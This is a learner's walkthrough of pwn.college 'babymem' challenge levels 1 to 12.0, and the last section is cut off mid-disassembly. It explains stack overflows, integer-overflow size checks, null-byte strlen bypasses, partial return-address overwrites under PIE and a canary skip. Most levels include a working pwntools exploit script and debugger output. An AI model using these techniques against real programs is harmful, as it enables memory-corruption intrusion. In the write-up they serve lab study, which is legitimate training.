# 1. Level 1:

> In this level, there is a "win" variable.
> By default, the value of this variable is zero.
> However, when this variable is non-zero, the flag will be printed.
> You can make this variable be non-zero by overflowing the input buffer.
> The "win" variable is stored at 0x7ffcca1e24f8, 56 bytes after the start of your input buffer.

Address of variables:

    buf = 0x7ffcca1e24c0
    win = 0x7ffcca1e24f8
    

- This challenge gives you 57 bytes to overwrite win variable. So, let's do it.
 ------------------------------------------------------
 
  **Look clearly at this challenge; in this area, I will perform another my mindsets**.

- Let debug it, you can see, it call challenge and run it after checking canary. Therefore, what happen when I overwrite canary variable????

```
   0x0000000000002251 <+248>:   call   0x1cbf <challenge>
   0x0000000000002256 <+253>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000000225a <+257>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000002263 <+266>:   je     0x226a <main+273>
   0x0000000000002265 <+268>:   call   0x1160 <__stack_chk_fail@plt>
```

- It isn't important, I still get my flag. However, I can't return address I overwrite because this check.

```
You win! Here is your flag:
pwn.college{.....}


Goodbye!
*** stack smashing detected ***: terminated
```
- I think in next level, it will require work with this canary variable.

# 1. Level 1.1:
- I do similar work to before, it still successful.
- However, we need to study, so I don't do this trick.
- Let's start:
**Debug this file, disas function challenge:**

-There are some important segments. 
```
   0x00005653cb32a924 <+163>:   mov    rdx,QWORD PTR [rbp-0x48]
   0x00005653cb32a928 <+167>:   mov    rax,QWORD PTR [rbp-0x40]
   0x00005653cb32a92c <+171>:   mov    rsi,rax
   0x00005653cb32a92f <+174>:   mov    edi,0x0
   0x00005653cb32a934 <+179>:   call   0x5653cb32a1a0 <read@plt>
```
```
   0x000055be6290096e <+237>:   mov    rax,QWORD PTR [rbp-0x38]
   0x000055be62900972 <+241>:   mov    eax,DWORD PTR [rax]
   0x000055be62900974 <+243>:   test   eax,eax
   0x000055be62900976 <+245>:   je     0x55be62900982 <challenge+257>
```

-Let show address of win and buf:

```
(gdb) x $rbp-0x40
0x7fff547ff110: 0x547ff120
(gdb) x $rbp-0x38
0x7fff547ff118: 0x547ff13c
```

    win - buf = 0x547ff13c - 0x547ff120 = 28 
    
-So, you need to 29 byte to overwrite win variable.

--------------
- **If you overwrite canary variable, it will work.**
# 2. Level 2.0:
> In this level, there is a "win" variable.
> By default, the value of this variable is zero.
> However, if you can set variable to 0x40f266ff, the flag will be printed.
> You can change this variable by overflowing the input buffer, but keep endianness in mind!
> The "win" variable is stored at 0x7ffc062920e8, 24 bytes after the start of your input buffer.


My script:

```
from pwn import *
r = process('/challenge/babymem_level2.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'28')
r.recvuntil(b'Send your payload (up to 28 bytes)!')
r.sendline(b'A'*24 + p32(0x40f266ff))
r.interactive()
```

# 2.1. Level2.1:

- First, we need to find offset between buf and win variable:
```
(gdb) x $rbp-0x70
0x7fff7cd6ff70: 0x7cd6ff80
(gdb) x $rbp-0x68
0x7fff7cd6ff78: 0x7cd6ffc8
```

    offset = 0x7cd6ffc8 - 0x7cd6ff80 = 72
    
- Next, overwrite value of win variabe: **0x3be21a84**

`0x000055f5c2b76465 <+252>:   cmp    eax,0x3be21a84`

```
from pwn import *
r = process('/challenge/babymem_level2.1')
r.recvuntil(b'Payload size: ')
r.sendline(b'76')
r.recvuntil(b'Send your payload (up to 76 bytes)!')
r.sendline(b'A'*72 + p32(0x3be21a84))
r.interactive()
```

# 3. Level3.0:
> In this level, there is no "win" variable.
> You will need to force the program to execute the win() function
> by directly overflowing into the stored return address back to main.


-It is clear that you need at least 152 bytes to overwrite the return address.
-Therefore you must find the address of win function. One of the methods is to use debug and other is to use command `nm /challenge/babymem_level3.0`

command nm:

    00000000004019fa T win
    
gdb:    
    
    (gdb) x win
    0x4019fa <win>: 0xfa1e0ff3
My script:
```
from pwn import *
r = process('/challenge/babymem_level3.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'160')
r.recvuntil(b'Send your payload (up to 160 bytes)!')
r.sendline(b'A'*152 + p64(0x4019fa))
r.interactive()
```
# 3.1. Level 3.1:

-In this level, you must to debug program.
- Disas challenge, important segment:

```
   0x00000000004017f4 <+178>:   lea    rax,[rbp-0x88]
   0x00000000004017fb <+185>:   mov    rsi,rax
   0x00000000004017fe <+188>:   lea    rdi,[rip+0x916]        # 0x40211b
   0x0000000000401805 <+195>:   mov    eax,0x0
   0x000000000040180a <+200>:   call   0x4011a0 <__isoc99_scanf@plt>
   0x000000000040180f <+205>:   mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000401816 <+212>:   mov    rsi,rax
   0x0000000000401819 <+215>:   lea    rdi,[rip+0x900]        # 0x402120
   0x0000000000401820 <+222>:   mov    eax,0x0
   0x0000000000401825 <+227>:   call   0x401140 <printf@plt>
   0x000000000040182a <+232>:   mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000401831 <+239>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401835 <+243>:   mov    rsi,rax
   0x0000000000401838 <+246>:   mov    edi,0x0
   0x000000000040183d <+251>:   call   0x401170 <read@plt>
   0x0000000000401842 <+256>:   mov    DWORD PTR [rbp-0xc],eax
   0x0000000000401845 <+259>:   cmp    DWORD PTR [rbp-0xc],0x0
   0x0000000000401849 <+263>:   jns    0x401877 <challenge+309>
   0x000000000040184b <+265>:   call   0x401110 <__errno_location@plt>
   0x0000000000401850 <+270>:   mov    eax,DWORD PTR [rax]
   0x0000000000401852 <+272>:   mov    edi,eax
   0x0000000000401854 <+274>:   call   0x4011c0 <strerror@plt>
   0x0000000000401859 <+279>:   mov    rsi,rax
   0x000000000040185c <+282>:   lea    rdi,[rip+0x8e5]        # 0x402148
   0x0000000000401863 <+289>:   mov    eax,0x0
   0x0000000000401868 <+294>:   call   0x401140 <printf@plt>
   0x000000000040186d <+299>:   mov    edi,0x1
   0x0000000000401872 <+304>:   call   0x4011b0 <exit@plt>
   0x0000000000401877 <+309>:   lea    rdi,[rip+0x8ee]        # 0x40216c
   0x000000000040187e <+316>:   call   0x401120 <puts@plt>
   0x0000000000401883 <+321>:   mov    eax,0x0
   0x0000000000401888 <+326>:   leave
   0x0000000000401889 <+327>:   ret
```

-In this level, we know approach to solve; now, we will calcualte offset to return address.

**Address of some variables:**

    win = 0x401645
    buf = 0x7ffc882ca280
    return address = 0x7ffc882ca308 
    
- So, the offset: 0x7ffc882ca308 - 0x7ffc882ca280 = 136
**My script:**

```
from pwn import *
r = process('/challenge/babymem_level3.1')
r.recvuntil(b'Payload size: ')
r.sendline(b'144')
r.recvuntil(b'Send your payload (up to 144 bytes)!')
r.sendline(b'A'*136 + p64(0x401645))
r.interactive()
```

# 4. Level 4.0:

> In this level, there is no "win" variable.
> You will need to force the program to execute the win() function
> by directly overflowing into the stored return address back to main


-First, I try to do something similar to level 3.1; however, It is impossible.

> *This challenge is more careful: it will check to make sure you
> don't want to provide so much data that the input buffer will
> overflow. But recall twos compliment, look at how the check is
> implemented, and try to beat it!
> Provided size is too large!*

-I start to debug the program and notice checking segment.

```
   0x00000000004028ae <+757>:   mov    eax,DWORD PTR [rbp-0x54]
   0x00000000004028b1 <+760>:   cmp    eax,0x3a
   0x00000000004028b4 <+763>:   jle    0x4028cc <challenge+787>
   0x00000000004028b6 <+765>:   lea    rdi,[rip+0x10dc]        # 0x403999
   0x00000000004028bd <+772>:   call   0x401120 <puts@plt>
   0x00000000004028c2 <+777>:   mov    edi,0x1
   0x00000000004028c7 <+782>:   call   0x4011b0 <exit@plt>
   0x00000000004028cc <+787>:   lea    rdi,[rip+0x10e5]        # 0x4039b8
```
-I see that **rbp-0x54** while address of buf is **rbp-0x8**; therefore, you can't overwrite it.
-However, notice that what happens when you input -1 in the payload size???
-The program will understand it its value is **0xffffffff**.

**My script:**

```
from pwn import *
r = process('/challenge/babymem_level4.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'-1')
r.recvuntil(b'Send your payload (up to -1 bytes)!')
r.sendline(b'A'*88 + p64(0x00000000004024bc))
r.interactive()
```
# 4.1 Level 4.1:
-It is similar to the level before.
**My script:**

```
from pwn import *
r = process('/challenge/babymem_level4.1')
r.recvuntil(b'Payload size: ')
r.sendline(b'-1')
r.recvuntil(b'Send your payload (up to -1 bytes)!')
r.sendline(b'A'*40 + p64(0x0000000000401ac2))
r.interactive()
```
# 5. Level 5.0:
> In this level, there is no "win" variable.
> You will need to force the program to execute the win() function
> by directly overflowing into the stored return address back to main.

-First, I try something similar to the before level; however, it doesn't work.
```
babymem_level5.0: <stdin>:143: challenge: Assertion `record_size * record_num < (unsigned int) sizeof(input)' failed.
Aborted
```
-It clearly states that the size is an unsigned number; therefore, I think about what happens when an oversize 32 bit occurs.

**My script:**
```
from pwn import *
r = process('/challenge/babymem_level5.0')
r.recvuntil(b'Number of payload records to send: ')
r.sendline(b'8388608')
r.recvuntil('Size of each payload record: ')
r.sendline(b'512')
r.recvuntil(b'Send your payload (up to 4294967296 bytes)!')
r.sendline(b'A'*88 + p64(0x401656))
r.interactive()
```
# 5. Level 5.1:

-It is similar to level 5.0, but you need to find offset.
**My script:**
```
from pwn import *
r = process('/challenge/babymem_level5.1')
r.recvuntil(b'Number of payload records to send: ')
r.sendline(b'8388608')
r.recvuntil('Size of each payload record: ')
r.sendline(b'512')
r.recvuntil(b'Send your payload (up to 4294967296 bytes)!')
r.sendline(b'A'*72 + p64(0x4018a4))
r.interactive()
```
# 6. Level 6.0:
> In this level, there is no "win" variable.
> You will need to force the program to execute the win_authed() function
> by directly overflowing into the stored return address back to main

> One caveat in this challenge is that the win_authed() function must first auth:
> it only lets you win if you provide it with the argument 0x1337.
> Speifically, the win_authed() function looks something like:
>     void win_authed(int token)
>     {
>       if (token != 0x1337) return;
>       puts("You win! Here is your flag: ");
>       sendfile(1, open("/flag", 0), 0, 256);
>       puts("");
>       }
>     

-First, I spent many times to overwriting the token variable; however, it isn't successful. After that, I read:

> So how do you pass the check? There *is* a way, and we will cover it later,
> but for now, we will simply bypass it! You can overwrite the return address
> with *any* value (as long as it points to executable code), **not just the start
> of functions**. Let's overwrite past the token check in win!

~~-Bruh=)))).~~
```
   0x0000000000402339 <+0>:     endbr64
   0x000000000040233d <+4>:     push   rbp
   0x000000000040233e <+5>:     mov    rbp,rsp
   0x0000000000402341 <+8>:     sub    rsp,0x10
   0x0000000000402345 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000402348 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x000000000040234f <+22>:    jne    0x402447 <win_authed+270>
   0x0000000000402355 <+28>:    lea    rdi,[rip+0xd94]        # 0x4030f0
```
-We can see that the address of win_authed remains unchanged; thus, what about if we jump after this check?
**It work**

**My script:**
```
from pwn import *
r = process('/challenge/babymem_level6.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'128')
r.recvuntil(b'Send your payload (up to 128 bytes)!')
r.sendline(b'A'*120 + p64(0x402355))
r.interactive()**
```
# 6. Level 6.1:

-It is completely similar to level 6.0, you only calculate offset myself.
**My script:**
```
from pwn import *
r = process('/challenge/babymem_level6.1')
r.recvuntil(b'Payload size: ')
r.sendline(b'96')
r.recvuntil(b'Send your payload (up to 96 bytes)!')
r.sendline(b'A'*88 + p64(0x4020b9))
r.interactive()
```
# 7. Level 7.0:
> In this level, there is no "win" variable.
> You will need to force the program to execute the win_authed() function
> by directly overflowing into the stored return address back to main.

> **WARNING: You sent in too much data, and overwrote more than two bytes of the address.
>          This can still work, because I told you the correct address to use for
>          this execution, but you should not rely on that information.
>          You can solve this challenge by only overwriting two bytes!**

**Notice that: Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!**

- I do something the same as level 6.0; however, it don't work; **PIE enable**. Therefore, I read again instruction and assembly code to find the reason.
- Let's break challenge function, there are somes important segment:
```
0x000055e4773dcd17 <+1287>:  mov    rdx,QWORD PTR [rbp-0x38]
0x000055e4773dcd1b <+1291>:  mov    rax,QWORD PTR [rbp-0x8]
0x000055e4773dcd1f <+1295>:  mov    rsi,rax
0x000055e4773dcd22 <+1298>:  mov    edi,0x0
0x000055e4773dcd27 <+1303>:  call   0x55e4773dc180 <read@plt>
0x000055e4773dcd2c <+1308>:  mov    DWORD PTR [rbp-0xc],eax
```

```
0x0000556b1004fe64 <+1620>:  mov    eax,DWORD PTR [rbp-0xc]
0x0000556b1004fe67 <+1623>:  movsxd rdx,eax
0x0000556b1004fe6a <+1626>:  mov    rax,QWORD PTR [rbp-0x8]
0x0000556b1004fe6e <+1630>:  add    rdx,rax
0x0000556b1004fe71 <+1633>:  mov    rax,QWORD PTR [rip+0x4318]        # 0x556b10054190 <rp_>
0x0000556b1004fe78 <+1640>:  add    rax,0x2
0x0000556b1004fe7c <+1644>:  cmp    rdx,rax
0x0000556b1004fe7f <+1647>:  jbe    0x556b1004febd <challenge+1709>
```
-I think the step check in the second segment which I bring to you, is not important because the program doesn't exit after that; it only prints instructions.
- This takes input from the buffer, adds with the size of the payload you write, and compare its with the **value** of the return address + 0x2. If you don't like it, you can write bytes \x00 instead of random bytes.

-The important information:

**Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment), this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few times until it works (statistically, after 8 times or so).
One caveat in this challenge is that the win_authed() function must first auth:**

- I think we can check the number of nibbles by using `objdump`, it also search for the address of the instruction after the condition to bypass checking.

**My script:**
```
from pwn import *
r = process('/challenge/babymem_level7.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'58')
r.recvuntil(b'Send your payload (up to 58 bytes)!')
r.sendline(b'\x00'*56 + 0x1718.to_bytes(2, 'little'))
r.interactive()
```
-It takes me several times to get the flag, so I will do something smarter.

```
from pwn import *
while True:
    r = process('/challenge/babymem_level7.0')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'58')
    r.recvuntil(b'Send your payload (up to 58 bytes)!')
    r.sendline(b'\x00'*56 + 0x1718.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```


# 7. Level 7.1:
-This requires a similar request in level 7.0, so we will do it step by step to understand more.
- First: `objdump -d -M intel /challenge/babymem_level7.1`

Depend on it, we need to overwrite byte 0x1551 to bypass the condition.
- Next, we need to calculate the offset between buffer and return address; we do this in before level. 
    `offset = 120`
- Finally, write script:

```
from pwn import *
while True:
    r = process('/challenge/babymem_level7.1')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'122')
    r.recvuntil(b'Send your payload (up to 122 bytes)!')
    r.sendline(b'\x00'*120 + 0x1551.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```

# 8. Level 8.0:
> In this level, there is no "win" variable.
> You will need to force the program to execute the win_authed() function
> by directly overflowing into the stored return address back to main.

-I write something that is long and the program gives me result:
```
Checking length of received string...
babymem_level8.0: <stdin>:193: challenge: Assertion `string_length < 120' failed.
Aborted
```
-Let's debug or use the objdump command to find the check to bypass this. I see the important segment:
```
0x000000000000216b <+1513>:  mov    rdx,QWORD PTR [rbp-0xa8]
0x0000000000002172 <+1520>:  mov    rax,QWORD PTR [rbp-0x10]
0x0000000000002176 <+1524>:  mov    rsi,rax
0x0000000000002179 <+1527>:  mov    edi,0x0
0x000000000000217e <+1532>:  call   0x11c0 <read@plt>
0x0000000000002183 <+1537>:  mov    DWORD PTR [rbp-0x14],eax
0x0000000000002186 <+1540>:  lea    rdi,[rip+0x218b]        # 0x4318
0x000000000000218d <+1547>:  call   0x1160 <puts@plt>
0x0000000000002192 <+1552>:  mov    rax,QWORD PTR [rbp-0x10]
0x0000000000002196 <+1556>:  mov    rdi,rax
0x0000000000002199 <+1559>:  call   0x1180 <strlen@plt>
0x000000000000219e <+1564>:  mov    QWORD PTR [rbp-0x20],rax
0x00000000000021a2 <+1568>:  cmp    QWORD PTR [rbp-0x20],0x77
0x00000000000021a7 <+1573>:  jbe    0x21c8 <challenge+1606>
```
-I see the strlen function to calculate the length of my string input, so how does strlen work? It takes the agrument as the pointer and reads through each letter until it reads a null byte(\x00).
-Therefore, I think there is something interesting when I only input nullbyte or nullbyte first; I bypass this check. The work after is the same as above level.
**My script:**
```
from pwn import *
while True:
    r = process('/challenge/babymem_level8.0')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'170')
    r.recvuntil(b'Send your payload (up to 170 bytes)!')
    r.sendline(b'\x00'*168 + 0x1a8a.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```
# 8. Level 8.1:
-It is the same as above level.
**My script:**
```
from pwn import *
while True:
    r = process('/challenge/babymem_level8.1')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'154')
    r.recvuntil(b'Send your payload (up to 154 bytes)!')
    r.sendline(b'\x00'*152 + 0x14d4.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```
# 9. Level 9.0:
> While canaries are enabled, this program reads your input 1 byte at a time,
> tracking how many bytes have been read and the offset from your input buffer
> to read the byte to using a local variable on the stack.
> The code for doing this looks something like:
>     while (n < size) {
>       n += read(0, input + n, 1);    }As it turns out, you can use this local variable `n` to jump over the canary.
> Your input buffer is stored at 0x7ffde672cd90, and this local variable `n`
> is stored 40 bytes after it at 0x7ffde672cdb8.
> 
> When you overwrite `n`, you will change the program's understanding of
> how many bytes it has read in so far, and when it runs `read(0, input + n, 1)`
> again, it will read into an offset that you control.
> This will allow you to reposition the write *after* the canary, and write
> into the return address!
> 
> The payload size is deceptively simple.
> You don't have to think about how many bytes you will end up skipping:
> with the while loop described above, the payload size marks the
> *right-most* byte that will be read into.
> As far as this challenge is concerned, there is no difference between bytes
> "skipped" by fiddling with `n` and bytes read in normally: the values
> of `n` and `size` are all that matters to determine when to stop reading,
> *not* the number of bytes actually read in.
> 
> That being said, you *do* need to be careful on the sending side: don't send
> the bytes that you're effectively skipping!

-Let's goooo!!! After reading the instructions, I debug the program and find some important segments.
```
0x0000000000002754 <+1073>:  lea    rax,[rbp-0x58]
0x0000000000002758 <+1077>:  mov    rsi,rax
0x000000000000275b <+1080>:  lea    rdi,[rip+0x15ce]        # 0x3d30
0x0000000000002762 <+1087>:  mov    eax,0x0
0x0000000000002767 <+1092>:  call   0x11d0 <__isoc99_scanf@plt>
```

```
0x0000000000002a02 <+1759>:  mov    rax,QWORD PTR [rbp-0x48]
0x0000000000002a06 <+1763>:  mov    eax,DWORD PTR [rax]
0x0000000000002a08 <+1765>:  movsxd rdx,eax
0x0000000000002a0b <+1768>:  mov    rax,QWORD PTR [rbp-0x50]
0x0000000000002a0f <+1772>:  add    rax,rdx
0x0000000000002a12 <+1775>:  mov    edx,0x1
0x0000000000002a17 <+1780>:  mov    rsi,rax
0x0000000000002a1a <+1783>:  mov    edi,0x0
0x0000000000002a1f <+1788>:  call   0x11a0 <read@plt>
```

```
0x0000000000002a24 <+1793>:  mov    rdx,QWORD PTR [rbp-0x48]
0x0000000000002a28 <+1797>:  mov    edx,DWORD PTR [rdx]
0x0000000000002a2a <+1799>:  add    eax,edx
0x0000000000002a2c <+1801>:  mov    edx,eax
0x0000000000002a2e <+1803>:  mov    rax,QWORD PTR [rbp-0x48]
0x0000000000002a32 <+1807>:  mov    DWORD PTR [rax],edx
0x0000000000002a34 <+1809>:  mov    rax,QWORD PTR [rbp-0x48]
0x0000000000002a38 <+1813>:  mov    eax,DWORD PTR [rax]
0x0000000000002a3a <+1815>:  movsxd rdx,eax
0x0000000000002a3d <+1818>:  mov    rax,QWORD PTR [rbp-0x58]
0x0000000000002a41 <+1822>:  cmp    rdx,rax
0x0000000000002a44 <+1825>:  jb     0x29d6 <challenge+1715>
```
**-The program operates:**
- It writes one byte of your input to locate the address(input + n)
- Check n < size and loop; otherwise, it exits.

**Check address of some variable:**
```
buf = 0x7ffde672cd90
n = 0x7ffde672cdb8
ret_addr= 0x7ffde672cdd8
```
-As you see, we can overwrite variable n, so what happens when we overwrite it??
-We can jump to the address of what we want and overwrite it; moreover, we can bypass canary.
-Therefore, we calculate the offset to write a suitable value, and the number of payload sizes and lengths of n to exploit successfully.
**My script:**
```
from pwn import *
while True:
    r = process('/challenge/babymem_level9.0')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'74')
    r.recvuntil(b'Send your payload (up to 74 bytes)!')
    r.sendline(b'A'*37 + p32(0x47000000) + 0x222b.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```
# 9. Level 9.1:
-It is similar with level 9.0.
**My script:**
```
from pwn import *
while True:
    r = process('/challenge/babymem_level9.1')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'74')
    r.recvuntil(b'Send your payload (up to 74 bytes)!')
    r.sendline(b'A'*41 + p32(0x47000000) + 0x2086.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```
# 10. Level 10.0:
> In this level, the flag will be loaded into memory.
> However, at no point will this program actually print the buffer storing the flag.
-Let's debug this program, there are some important segments.

```
0x00005593d08b3648 <+473>:   mov    esi,0x0
0x00005593d08b364d <+478>:   lea    rdi,[rip+0xdef]        # 0x5593d08b4443
0x00005593d08b3654 <+485>:   mov    eax,0x0
0x00005593d08b3659 <+490>:   call   0x5593d08b2180 <open@plt>
0x00005593d08b365e <+495>:   mov    ecx,eax
0x00005593d08b3660 <+497>:   mov    rax,QWORD PTR [rbp-0x138]
0x00005593d08b3667 <+504>:   mov    edx,0x100
0x00005593d08b366c <+509>:   mov    rsi,rax
0x00005593d08b366f <+512>:   mov    edi,ecx
0x00005593d08b3671 <+514>:   call   0x5593d08b2160 <read@plt>
```
- I check the file name that opens and reads into [rbp-0x138]

```
(gdb) x 0x5593d08b4443
0x5593d08b4443: 0x61500067616c662f    #'/flag' = 0x2f666c6167
```
- Thus, flag will stored at [rbp - 0x138].

```
0x00005593d08b376b <+764>:   mov    rdx,QWORD PTR [rbp-0x148]
0x00005593d08b3772 <+771>:   mov    rax,QWORD PTR [rbp-0x140]
0x00005593d08b3779 <+778>:   mov    rsi,rax
0x00005593d08b377c <+781>:   mov    edi,0x0
0x00005593d08b3781 <+786>:   call   0x5593d08b2160 <read@plt>
```
- My input start at [rbp-0x140].
 
**Look at this printf at the end of the function challenge**
```
0x00005593d08b38b3 <+1092>:  mov    rax,QWORD PTR [rbp-0x140]
0x00005593d08b38ba <+1099>:  mov    rsi,rax
0x00005593d08b38bd <+1102>:  lea    rdi,[rip+0xe1e]        # 0x5593d08b46e2
0x00005593d08b38c4 <+1109>:  mov    eax,0x0
0x00005593d08b38c9 <+1114>:  call   0x5593d08b2140 <printf@plt>
```
- It print my input buffer

**However, the offset between my input and flag is 31, and the printf funtion will print my input each char until NULL byte(\x00), so what happens when I combine my input and flag(no NULL byte between them, it also means that I input 31 char)???**
**Boom, I get the flag.**
# 10. Level 10.1:
- It is similar with level 10.0.
# 11. Level 11.0:
```
This challenge stores your input buffer in an mmapped page of memory!
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c864000
In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
Memory mapping the flag...
Called mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0x7f1a2c837000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c836000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c835000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c834000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c833000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c832000
Memory mapping the input buffer...
Called mmap(0, 85, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f1a2c831000
```

- It is similar to the above level; however, the offset is 0x6000, too large for input. 
- Therefore, we must write a script instead of input from the keyboard.
**My script:**
```
from pwn import *
r = process('/challenge/babymem_level11.0')
r.recvuntil(b'Payload size: ')
r.sendline(b'24576')
r.recvuntil(b'Send your payload (up to 24576 bytes)!')
r.sendline(b'A'*24576
        )
r.interactive()
```
---

**My problem**
- When I run the program
```
###
### Welcome to /challenge/babymem_level11.0!
###

The challenge() function has just been launched!
This challenge stores your input buffer in an mmapped page of memory!
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f92000
In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
Memory mapping the flag...
Called mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0x7effc4f65000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f64000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f63000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f62000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f61000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f60000
Memory mapping the input buffer...
Called mmap(0, 85, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f5f000
Payload size: 1
You have chosen to send 1 bytes of input!
This will allow you to write from 0x7effc4f5f000 (the start of the input buffer)
right up to (but not including) 0x7effc4f5f001 (which is -84 bytes beyond the end of the buffer).
Send your payload (up to 1 bytes)!
a
You sent 1 bytes!
The program's memory status:
- the input buffer starts at 0x7effc4f5f000
- the address of the flag is 0x7effc4f65000.
```
- However, the  address of the  flag is very strange and remains unchanged after every debug.
```
###
### Welcome to /challenge/babymem_level11.0!
###

The challenge() function has just been launched!
This challenge stores your input buffer in an mmapped page of memory!
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de73000
In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
Memory mapping the flag...
Called mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0xffffffffffffffff
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de46000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de45000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de44000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de43000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de42000
Memory mapping the input buffer...
Called mmap(0, 85, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7fcc4de41000
Payload size:
```
**- It is 0xffffffffffffffff; I don't know why when I debug this is broken.**

**- Otherwise, I notice that offset between**

`mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0x7effc4f65000`

and 

`mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7effc4f64000`

**is constant: 4096**

- The offset between mmap consecutive after these is also 4096.
- I guess this nmap with area is 0x1000, and mmap afterwards will start at the end of the previous nmap, so the offset will be 4096(0x1000). 
# 11. Level 11.1:
- It is similar to above level.
- You must find the return value of mmap after mmap(open '/flag') to find the address store flag. Next, you look for address of buf and calculate the offset.
 
**My script:**
```
from pwn import *
r = process('/challenge/babymem_level11.1')
r.recvuntil(b'Payload size: ')
r.sendline(b'32768')
r.recvuntil(b'Send your payload (up to 32768 bytes)!')
r.sendline(b'A'*32768
        )
r.interactive()
```
# 12. Level 12.0.
**I don't know exactly how I want to describe this challenge, however I think it is nice.**

Let's debug the program, there are some important segments.

```
0x00005609a6523c8d <+715>:   lea    rax,[rbp-0x50]
0x00005609a6523c91 <+719>:   mov    rsi,rax
0x00005609a6523c94 <+722>:   lea    rdi,[rip+0x1add]        # 0x5609a6525778
0x00005609a6523c9b <+729>:   mov    eax,0x0
0x00005609a6523ca0 <+734>:   call   0x5609a65231e0 <__isoc99_scanf@plt>
```
   
```
0x00005609a6523f0d <+1355>:  mov    rdx,QWORD PTR [rbp-0x50]
0x00005609a6523f11 <+1359>:  mov    rax,QWORD PTR [rbp-0x48]
0x00005609a6523f15 <+1363>:  mov    rsi,rax
0x00005609a6523f18 <+1366>:  mov    edi,0x0
